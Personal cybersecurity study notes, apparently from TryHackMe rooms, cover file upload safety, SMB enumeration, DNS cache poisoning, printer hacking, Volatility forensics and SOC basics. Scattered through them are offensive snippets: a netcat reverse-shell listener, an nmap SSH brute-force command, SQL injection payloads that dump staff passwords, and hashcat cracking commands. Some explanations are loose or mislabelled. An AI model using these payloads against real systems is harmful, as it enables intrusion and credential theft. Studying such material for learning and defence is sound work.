# File upload

![Level: Novice-Intermediate](https://img.shields.io/badge/level-Novice%20Intermediate-ffd700)

A user may upload a file on a server such as an avatar. You must prevent users from uploading malicious files (ex : scripts), AND prevent users from accessing content belonging to other users (if they shouldn't).

* <i class="bi bi-info-square" style="background:#7cfc00"></i> Secure filters for uploaded files
  * ❌ DO NOT use some stupid filter allowing "xxx.png.php"
  * ❌ DO NOT use /upload /images /media /resources /tmp for user (non-public) files, and better, do not allow access to non-public files via URL <small>(or at least, use a "deny all, allow xxx" kind of .htaccess)</small>. Usually, instead of matching a folder (ex: "www") with the server root <small>(ex: "localhost/")</small>, we are matching it with a sub-folder <small>(ex: www/public)</small>, so that we can use a folder such as "www/uploads" not available via URL <small>(you can't do "localhost/../uploads" in a URL)</small>.
  * ❌ DO NOT trust "content-type"
  * ❌ USE secure functions/ways to get the name of the uploaded file. Hackers can try to bypass them, like by using ASCII characters, or stuff like that.

If an attacker manage to upload a PHP script on the server, they will most likely try to do **reverse engineering**, meaning using a command such as `sudo nc -lvnp 443`, and accessing a remote shell on your server <small>(443 = HTTPS, so you go "unnoticed")</small>.

<hr class="sl">

## Transfer files using SMB/NFS

![Level: Intermediate](https://img.shields.io/badge/level-Advanced-fae7b5)

* [THM Kenobi](https://tryhackme.com/room/kenobi)

SMB (Windows), and NFS (Linux), are mostly used internally to share files, instead of FTP which is mostly used externally. There is a tool called [Samba](https://www.samba.org/) that is making both systems using SMB, and NFS working together. Every device (printer, computers...) of a company make be linked via a folder `share`.

```bash
$ smbclient //IP/share_name
# ls <folder>: list files of <folder>
# cd <folder>: move to <folder>
# put <src> <dest>: put <src> (local) to <dest> (server)
# get <src> <dest>: get <src> (server), and save it to <dest> (local)
# pwd: get the path of the working directory

# download every file of a share
$ smbget -R  smb://IP/share_name
```

* <i class="bi bi-info-square" style="background:#7cfc00"></i> Try connecting without password
* <i class="bi bi-info-square" style="background:#7cfc00"></i> Attempt to list shares using nmap `nmap -p 445 –script=smb-enum-shares.nse,smb-enum-users.nse ip`

"Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. It's often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network."

* Using nmap we can enumerate a machine for SMB shares:
  * port 445, and 139
  * `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip> -vv`
* `smbclient //<ip>/anonymous` login without password
* You may find useful information
* https://tryhackme.com/room/kenobi

<hr class="sep-both">

# Assembly

![Level: Intermediate](https://img.shields.io/badge/level-Advanced-fae7b5)

One level above binary (010010...), we have a language called assembly which is basically written in instructions specific to a set of machines (Intel, ARM...). You need to use the appropriate tool according to the kind of application.

* <i class="bi bi-info-square" style="background:#fae7b5"></i> Use `radare2` to convert a binary in an assembly
* <i class="bi bi-info-square" style="background:#fae7b5"></i> Use `ILSpy`/`dotPeek` ❤️ to decompile .NET applications

<hr class="sep-both">

## Domain Name Hijacking via Cache poisoning

<div class="row row-cols-md-2"><div>

This is a old attack that shouldn't be possible now. A hacker would usually try to make an authoritative server store a records which a legitimate domain names leading to a malicious server.

* Redirect to a malicious website <small>(ex: with a ton of ads, malware...)</small>
* Do a ManInTheMiddle attack, in which the attacker could receive the mails sent to another one, read/... them, and send them to the original legitimate receiver.
* Isolate someone to prevent this person to access a website/...

When a DNS server request a DNS record that wasn't cached, a request is made with **a query Id** (16 bits), awaiting the reply at a **port**, for the **queried domain**. The problem is that if a malicious DNS server managed to match these 3, and reply before the legitimate server, then it could match a malicious IP for the queried domain.

* Unless it was an old server increasing Ids by one, matching the query Id is quite hard
* And matching the right timing to send the request is also hard. One trick is making the request to a domain name that you could guess is not in the cache <small>(for instance, one of yours)</small>. As you know the TTL, you can guess when the next request will be sent.
</div><div>

**Dan Kaminsky**: this attack use the fact that inside the request, a field **Authority** might be filled with the nameserver/authoritative server that should be ask for matters related to this domain name. In the field **Additional**, the IPs of the nameserver are stored to avoid a loop in which the DNS will try to find the IP of the nameserver. In Dan Kaminsky attack, we are sending a malicious NS, that means that the DNS *may* ask us next time.

A way to patch this is for the DNS to have a good entropy when generating Ids. [See DNS Entropy](https://www.dns-oarc.net/oarc/services/dnsentropy).

This video is a bit long, but explain better [the Dan Kaminsky attack](https://www.youtube.com/watch?v=qftKfFVHVuY).
</div></div>

<hr class="sep-both">

### Steganography

Hide things in images: [Steganography](https://0xrick.github.io/lists/stego/).

<hr class="sep-both">

## Printers - IPP - (TCP/631)

https://tryhackme.com/room/printerhacking101

"The Internet Printing Protocol (IPP) - is a specialized Internet protocol for communication between client devices and printers. It allows clients to submit one or more print jobs to the printer or print server, and perform tasks such as querying the status of a printer, obtaining the status of print jobs, or canceling individual print jobs."

If open to the internet, everyone can print, or use it as a middleman for attacks.

https://www.variot.eu/

"An open IPP port can expose a lot of sensitive information such as printer name, location, model, firmware version, or even printer wifi SSID."

* https://github.com/RUB-NDS/PRET
* pip install colorama pysnmp

```bash
$ python pret.py
# look for printers
$ python pret.py file.lan ps # test language postscript
$ python pret.py <ip> pjl # Printer Job Language
$ python pret.py /dev/usb/lp0 pcl # Printer Command Language
```

http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet

PRET isn't going to work here as it is using port 9000 by default

* Brute force ssh password `nmap <MACHINE_IP> -p 22 --script ssh-brute --script-arg userdb=user.txt`
* `http://ip:631/printers/`

<hr class="sep-both">

## OWASP

* https://owasp.org/www-project-top-ten/
* Juiceshop
* https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
* https://github.com/OWASP/wstg
* https://wiki.owasp.org/index.php/OWASP_Testing_Guide_v4_Table_of_Contents
* https://github.com/OWASP/CheatSheetSeries
* https://www.zaproxy.org/
* https://github.com/OWASP/Amass

<hr class="sep-both">

## enum4linux

![Usage: Enumerating Information](https://img.shields.io/badge/usage-Enumerating%20Information-ffd700)

I don't know if there is still an `enum.exe`, because I can't find it, but you can use the tool [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) for enumerating information from Windows, and Samba hosts.

```bash
$ ./enum4linux.pl <options> <ip>
# -U : list of users
# -M : list of devices
# -S : list of shares
# -o : os data
# -i : printer data
# -v : verbose
```

<hr class="sl">

## Volatility

![Usage: Forensics tool](https://img.shields.io/badge/usage-Forensics%20tool-ffd700)

<div class="row row-cols-md-2"><div>

Volatility is a free memory forensics tool.

<details class="details-e">
<summary>Install on Linux</summary>

It wouldn't work with `apt-get install volatility` on Kali-2022, so I had to do things manually, and it was tiring because it uses python2. There is a version for [python3](https://github.com/volatilityfoundation/volatility3/tree/stable) in development.

* `git clone https://github.com/volatilityfoundation/volatility.git`
* First patch ([source](https://alvinisonline.medium.com/volatility-importerror-no-module-named-crypto-hash-e515092fd8e3))
  * `curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py`
  * `sudo python2 get-pip.py`
  * `sudo apt-get install build-essential libssl-dev libffi-dev python2-dev`
* Second patch
  * `pip2 install pycryptodome`
  * `pip2 install --upgrade setuptools`
  * `pip2 install distorm3`
  * `python2 vol.py -h`
* You should add an alias: `alias vol='python2 /path/to/vol.py'`
* `vol -h`
</details>

In order to use Volatility, you need a memory capture (usually, a .raw file). Try checking out [FTK Imager](https://accessdata.com/product-download/ftk-imager-version-4-2-0), [Redline](https://www.fireeye.com/services/freeware/redline.html), [DumpIt.exe](https://www.aldeid.com/wiki/Dumpit), [winDD](https://sourceforge.net/projects/windd/)...

Volatility need to know on which version of Windows it should base its analysis. It's called profiles, and you can run `imageinfo` to find which profiles you can use.

```bash
$ vol -f memory_capture_file imageinfo
# Suggested Profile(s): ...
```

If the following commands are working, then the profile you took is the right one. You can view active processes/connections

```bash
# processes
$ vol -f memory_capture_file --profile=a_profile pslist
# connections
$ vol -f memory_capture_file --profile=a_profile netscan
# hidden processes
$ vol -f memory_capture_file --profile=a_profile psxview
# both actives, and actives+hidden
vol -f memory_capture_file --profile=a_profile ldrmodules > output
```

</div><div>

Malicious processes will most likely try to hide themselves. If you process is neither InLoad, InInit, InMem, then it's suspicious. You can use grep on the output to check if there is a process like this.

```bash
$ grep -o '^.*False.*False.*False.*' output
```

Processes aren't the only place to inspect. We can also check for unexpected patches in the standard system DLLs.

```bash
$ vol -f memory_capture_file --profile=a_profile apihooks
```

Look for injected code, and dump it

```bash
$ vol -f memory_capture_file --profile=a_profile malfind -D dest
```

View all the DLLs loaded into memory

```bash
$ vol -f memory_capture_file --profile=a_profile dlllist
# dump them
$ vol -f memory_capture_file --profile=a_profile --pid=infected_process_pid dlldump -D dest
```
</div></div>

Volatility
https://subscription.packtpub.com/book/security/9781838640804/10/ch10lvl1sec55/using-volatility-in-kali-linux

https://youtu.be/dB5852eAgpc

https://tryhackme.com/room/bpvolatility

* Inpect files - dump all processes, and ddl
  * https://www.virustotal.com/gui/home/upload
  * https://www.hybrid-analysis.com/
* AlienVault Open Threat Exchange (OTX) - An open-source threat tracking system
* SANS 408 - Windows Forensic Analysis
* https://github.com/stuxnet999/MemLabs

<hr class="sep-both">

## Base64

<div class="row row-cols-md-2"><div>

Base64 is only an encoding function. This isn't doing an encryption, or something cool like that, so it's not used for confidentiality. It could be used to write (encode) an image/... as a string.

> Most base64 strings are ending with "=", or "==".
</div><div>

```bash
$ echo "toto" | base64
dG90bwo=
$ echo "dG90bw=" | base64 -d
toto
```
</div></div>

<hr class="sep-both">

# Notes

* https://tryhackme.com/resources/blog/online-training-for-careers
* https://tryhackme.com/resources/blog/cyber-security-awareness-month

<hr class="sep-both">

## Other

The Operating System (OS) is the layer sitting between the hardware and the applications and programs you are running.

* Passwords saved in notes
* Private photos/documents/emails
* CIA
  * Confidentiality: ensure private
  * Integrity: not tampered with
  * Availability: available when needed
* Principle of the least privilege. 
* Intrusion Detection System (IDS): detect (IPS=blocks) system/network intrusion, and tries to break into the network
* Virtual Private Network (VPN) concentrator appliance: A VPN ensures that the network traffic cannot be read nor altered by a third party. It protects the confidentiality (secrecy) and integrity of the sent data.
* Antivirus software: You install an antivirus on your computer or smartphone to detect malicious files and block them from executing. 
* Host firewall: Unlike the firewall appliance, a hardware device, a host firewall is a program that ships as part of your system, or it is a program that you install on your system. For instance, MS Windows includes Windows Defender Firewall, and Apple macOS includes an application firewall; both are host firewalls.
* https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html
* SOC
  * 24 hours a day, seven days a week
  * vulnerabilities
  * use logs (DHCP, firewall, DNS...)
  * might use a SIEM
  * Network security monitoring (NSM): This focuses on monitoring the network data and analyzing the traffic to detect signs of intrusions. 
  * Threat hunting: With threat hunting, the SOC assumes an intrusion has already taken place and begins its hunt to see if they can confirm this assumption.
  * Other services by the SOC include cyber security training.

<hr class="sep-both">

# Resources

* There are websites on the Internet that allow you to check the reputation of an IP address to see whether it's malicious or suspicious.
  * AbuseIPDB
  * Cisco Talos Intelligence

>  cyber attack include an attacker making our network or systems inaccessible, defacing (changing) the public website,

<hr class="sep-both">

## Web

* **Load Balancers**: handle if a server is down (periodic health check - if no response, no more clients until there is an answer), and manage the server load
  * algorithms are round-robin, which sends it to each server in turn, or weighted, which checks how many requests a server is currently dealing with and sends it to the least busy server
* CDN (Content Delivery Networks): CDN works out where the nearest server is physically located and sends the request there instead of potentially the other side of the world
* Common databases: MySQL, MSSQL, MongoDB, GraphQL, Postgres
* WAF (Web Application Firewall)
  * protect web servers (ex: against DDOS)
  * analyse if the traffic comes from a bit, and the rate of the traffic
* Apache, Nginx, IIS and NodeJS
* Virtual Hosts: one server and multiples domains
* PHP, Python, Ruby, NodeJS, Perl and many more

<hr class="sep-both">

## SQLi

* https://tryhackme.com/room/sqlinjectionlm
* UNION: same "type" too / not for SQL, but for the website
* `'` to discover if an attack is possible
* `';-- -`
* `0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`: `article,staff_users`
* The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 
* `0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`
* `0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`
* In-Band (error+union): same channel
* Blind SQLi (boolean-based / Authentication Bypass=we use it to login without password)
* `where database() like '%';--`
* `FROM information_schema.tables WHERE table_schema = 'xxx' and table_name like 'a%';--`
* `FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='xxx' and TABLE_NAME='yyy' and COLUMN_NAME like '%';`. If multiple results, add a condition "COLUMN_NAME !='id'"
* admin123' UNION SELECT SLEEP(5);-- 
* If there was no pause in the response time, we know that the query was unsuccessful
* and length(table_name) =19
* analytics_referrers
* Out-of-band
* Remediations
  * Input Validation (remove invalid stuff?)
  * Escaping User Input (escape invalid stuff?)

<hr class="sep-both">

# Learn again

* netdiscover
* https://github.com/hashcat/hashcat
* hashcat --username --show -a 0 -m 1000 hashes.txt rockyou.txt
  * xxx:yyy --username ignore xxx
  * -a: attack mode
  * -m: hash type=nt=1000
  * https://github.com/hashcat/hashcat
* type file (cat file)
* https://www.sans.org/cyberaces/
* File permissions in Windows are controlled using DACLs (Discretionary Access Control List). To view these DACLs you can use the icacls command
* whoami /groups: see your groups
* dir flag* /s /p | search -f flag*
* https://crackstation.net/
* bg instead of background?
* In practice, any NT/SYS is ok
* X
  * use auxiliary/analyze/crack_windows
  * set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
* echo xxx name >> /etc/hosts 
* nmap xxx
  * Service Info: Host: Os: 
* https://github.com/wyllianbs/xfreerdp-gui && https://github.com/FreeRDP/FreeRDP
  * xfreedrp /u:x /p:y /v:ip
* https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2019-1388